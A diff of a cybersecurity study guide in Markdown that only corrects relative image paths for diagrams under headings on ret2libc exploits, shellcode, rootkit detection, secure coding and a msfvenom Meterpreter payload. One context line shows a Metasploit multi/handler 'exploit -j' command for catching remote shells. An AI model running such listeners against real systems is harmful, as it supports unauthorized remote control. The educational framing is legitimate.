+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-diagram.svg" alt="Diagram: Explain return-to-libc and when you would use it over a full ROP chain." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-sticky.svg" alt="Sticky Note: Explain return-to-libc and when you would use it over a full ROP chain." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-sticky.svg" alt="Sticky Note: Explain return-to-libc and when you would use it over a full ROP chain." width="30%">
 </a>
 
 
@@ -3398,14 +3398,14 @@ Use full ROP when:
 
 ### Q18: How would you detect a rootkit on a Linux system?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-handwritten.svg" alt="Handwritten: How would you detect a rootkit on a Linux system?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-handwritten.svg" alt="Handwritten: How would you detect a rootkit on a Linux system?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-diagram.svg" alt="Diagram: How would you detect a rootkit on a Linux system?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-diagram.svg" alt="Diagram: How would you detect a rootkit on a Linux system?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-sticky.svg" alt="Sticky Note: How would you detect a rootkit on a Linux system?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-would-you-detect-a-rootkit-on-a-linux-system-sticky.svg" alt="Sticky Note: How would you detect a rootkit on a Linux system?" width="30%">
 </a>
 
 
@@ -3439,14 +3439,14 @@ rpm -Va             # RHEL/CentOS
 
 ### Q19: What is the difference between black-box, white-box, and grey-box fuzzing?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-handwritten.svg" alt="Handwritten: What is the difference between black-box, white-box, and grey-box fuzzing?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-handwritten.svg" alt="Handwritten: What is the difference between black-box, white-box, and grey-box fuzzing?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-diagram.svg" alt="Diagram: What is the difference between black-box, white-box, and grey-box fuzzing?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-diagram.svg" alt="Diagram: What is the difference between black-box, white-box, and grey-box fuzzing?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-sticky.svg" alt="Sticky Note: What is the difference between black-box, white-box, and grey-box fuzzing?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-black-box-white-box-and-grey-box-fuzzing-sticky.svg" alt="Sticky Note: What is the difference between black-box, white-box, and grey-box fuzzing?" width="30%">
 </a>
 
 
@@ -3462,14 +3462,14 @@ rpm -Va             # RHEL/CentOS
 
 ### Q20: Explain how the Stuxnet PLC rootkit worked at the code level.
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-handwritten.svg" alt="Handwritten: Explain how the Stuxnet PLC rootkit worked at the code level." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-handwritten.svg" alt="Handwritten: Explain how the Stuxnet PLC rootkit worked at the code level." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-diagram.svg" alt="Diagram: Explain how the Stuxnet PLC rootkit worked at the code level." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-diagram.svg" alt="Diagram: Explain how the Stuxnet PLC rootkit worked at the code level." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-sticky.svg" alt="Sticky Note: Explain how the Stuxnet PLC rootkit worked at the code level." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-how-the-stuxnet-plc-rootkit-worked-at-the-code-level-sticky.svg" alt="Sticky Note: Explain how the Stuxnet PLC rootkit worked at the code level." width="30%">
 </a>
 
 
@@ -3511,14 +3511,14 @@ This was the first known malware to cause physical destruction by manipulating i
 
 ### C/C++: Integer Overflow Leading to Buffer Overflow
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-handwritten.svg" alt="Handwritten: C/C++: Integer Overflow Leading to Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-handwritten.svg" alt="Handwritten: C/C++: Integer Overflow Leading to Buffer Overflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-diagram.svg" alt="Diagram: C/C++: Integer Overflow Leading to Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-diagram.svg" alt="Diagram: C/C++: Integer Overflow Leading to Buffer Overflow" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-sticky.svg" alt="Sticky Note: C/C++: Integer Overflow Leading to Buffer Overflow" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/c-c-integer-overflow-leading-to-buffer-overflow-sticky.svg" alt="Sticky Note: C/C++: Integer Overflow Leading to Buffer Overflow" width="30%">
 </a>
 
 
@@ -3568,14 +3568,14 @@ int main() {
 
 ### Java: XML External Entity (XXE) Prevention
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-handwritten.svg" alt="Handwritten: Java: XML External Entity (XXE) Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-handwritten.svg" alt="Handwritten: Java: XML External Entity (XXE) Prevention" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-diagram.svg" alt="Diagram: Java: XML External Entity (XXE) Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-diagram.svg" alt="Diagram: Java: XML External Entity (XXE) Prevention" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-sticky.svg" alt="Sticky Note: Java: XML External Entity (XXE) Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/java-xml-external-entity-xxe-prevention-sticky.svg" alt="Sticky Note: Java: XML External Entity (XXE) Prevention" width="30%">
 </a>
 
 
@@ -3612,14 +3612,14 @@ public class SecureXMLParser {
 
 ### Java: Path Traversal Prevention
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-handwritten.svg" alt="Handwritten: Java: Path Traversal Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-handwritten.svg" alt="Handwritten: Java: Path Traversal Prevention" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-diagram.svg" alt="Diagram: Java: Path Traversal Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-diagram.svg" alt="Diagram: Java: Path Traversal Prevention" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-sticky.svg" alt="Sticky Note: Java: Path Traversal Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/java-path-traversal-prevention-sticky.svg" alt="Sticky Note: Java: Path Traversal Prevention" width="30%">
 </a>
 
 
@@ -3653,14 +3653,14 @@ public class SecureFileAccess {
 
 ### JavaScript: Prototype Pollution Prevention
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-handwritten.svg" alt="Handwritten: JavaScript: Prototype Pollution Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-handwritten.svg" alt="Handwritten: JavaScript: Prototype Pollution Prevention" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-diagram.svg" alt="Diagram: JavaScript: Prototype Pollution Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-diagram.svg" alt="Diagram: JavaScript: Prototype Pollution Prevention" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-sticky.svg" alt="Sticky Note: JavaScript: Prototype Pollution Prevention" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/javascript-prototype-pollution-prevention-sticky.svg" alt="Sticky Note: JavaScript: Prototype Pollution Prevention" width="30%">
 </a>
 
 
@@ -3716,14 +3716,14 @@ try {
 
 ### Node.js: Preventing Command Injection
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-handwritten.svg" alt="Handwritten: Node.js: Preventing Command Injection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-handwritten.svg" alt="Handwritten: Node.js: Preventing Command Injection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-diagram.svg" alt="Diagram: Node.js: Preventing Command Injection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-diagram.svg" alt="Diagram: Node.js: Preventing Command Injection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-sticky.svg" alt="Sticky Note: Node.js: Preventing Command Injection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/node-js-preventing-command-injection-sticky.svg" alt="Sticky Note: Node.js: Preventing Command Injection" width="30%">
 </a>
 
 
@@ -3772,14 +3772,14 @@ function backupUser_safer(username) {
 
 ### Full Exploit Script for ret2libc with ASLR Bypass
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-handwritten.svg" alt="Handwritten: Full Exploit Script for ret2libc with ASLR Bypass" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-handwritten.svg" alt="Handwritten: Full Exploit Script for ret2libc with ASLR Bypass" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-diagram.svg" alt="Diagram: Full Exploit Script for ret2libc with ASLR Bypass" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-diagram.svg" alt="Diagram: Full Exploit Script for ret2libc with ASLR Bypass" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-sticky.svg" alt="Sticky Note: Full Exploit Script for ret2libc with ASLR Bypass" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/full-exploit-script-for-ret2libc-with-aslr-bypass-sticky.svg" alt="Sticky Note: Full Exploit Script for ret2libc with ASLR Bypass" width="30%">
 </a>
 
 
@@ -3843,14 +3843,14 @@ if __name__ == "__main__":
 
 ### Explanation of the movaps Stack Alignment Issue
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-handwritten.svg" alt="Handwritten: Explanation of the movaps Stack Alignment Issue" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-handwritten.svg" alt="Handwritten: Explanation of the movaps Stack Alignment Issue" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-diagram.svg" alt="Diagram: Explanation of the movaps Stack Alignment Issue" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-diagram.svg" alt="Diagram: Explanation of the movaps Stack Alignment Issue" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-sticky.svg" alt="Sticky Note: Explanation of the movaps Stack Alignment Issue" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explanation-of-the-movaps-stack-alignment-issue-sticky.svg" alt="Sticky Note: Explanation of the movaps Stack Alignment Issue" width="30%">
 </a>
 
 
@@ -3954,14 +3954,14 @@ SUMMARY: AddressSanitizer: heap-buffer-overflow fuzz_target.c:21
 
 ### Windows x86 MessageBox Shellcode
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-handwritten.svg" alt="Handwritten: Windows x86 MessageBox Shellcode" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-handwritten.svg" alt="Handwritten: Windows x86 MessageBox Shellcode" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-diagram.svg" alt="Diagram: Windows x86 MessageBox Shellcode" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-diagram.svg" alt="Diagram: Windows x86 MessageBox Shellcode" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-sticky.svg" alt="Sticky Note: Windows x86 MessageBox Shellcode" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/windows-x86-messagebox-shellcode-sticky.svg" alt="Sticky Note: Windows x86 MessageBox Shellcode" width="30%">
 </a>
 
 
@@ -4011,14 +4011,14 @@ _start:
 
 ### msfvenom for Windows: Meterpreter Payload
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-handwritten.svg" alt="Handwritten: msfvenom for Windows: Meterpreter Payload" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-handwritten.svg" alt="Handwritten: msfvenom for Windows: Meterpreter Payload" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-diagram.svg" alt="Diagram: msfvenom for Windows: Meterpreter Payload" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-diagram.svg" alt="Diagram: msfvenom for Windows: Meterpreter Payload" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-sticky.svg" alt="Sticky Note: msfvenom for Windows: Meterpreter Payload" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/msfvenom-for-windows-meterpreter-payload-sticky.svg" alt="Sticky Note: msfvenom for Windows: Meterpreter Payload" width="30%">
 </a>
 
 
@@ -4049,14 +4049,14 @@ msf6 exploit(multi/handler) > exploit -j
 
 ### E-commerce Application Threat Model
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-handwritten.svg" alt="Handwritten: E-commerce Application Threat Model" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-handwritten.svg" alt="Handwritten: E-commerce Application Threat Model" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-diagram.svg" alt="Diagram: E-commerce Application Threat Model" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-diagram.svg" alt="Diagram: E-commerce Application Threat Model" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-sticky.svg" alt="Sticky Note: E-commerce Application Threat Model" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/e-commerce-application-threat-model-sticky.svg" alt="Sticky Note: E-commerce Application Threat Model" width="30%">
 </a>
 
 
@@ -4084,14 +4084,14 @@ msf6 exploit(multi/handler) > exploit -j
 
 ### Creating YARA Rules for Malware Detection
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-handwritten.svg" alt="Handwritten: Creating YARA Rules for Malware Detection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-handwritten.svg" alt="Handwritten: Creating YARA Rules for Malware Detection" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-diagram.svg" alt="Diagram: Creating YARA Rules for Malware Detection" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/creating-yara-rules-for-malware-detection-diagram.svg" target="_blank" rel="noopener">
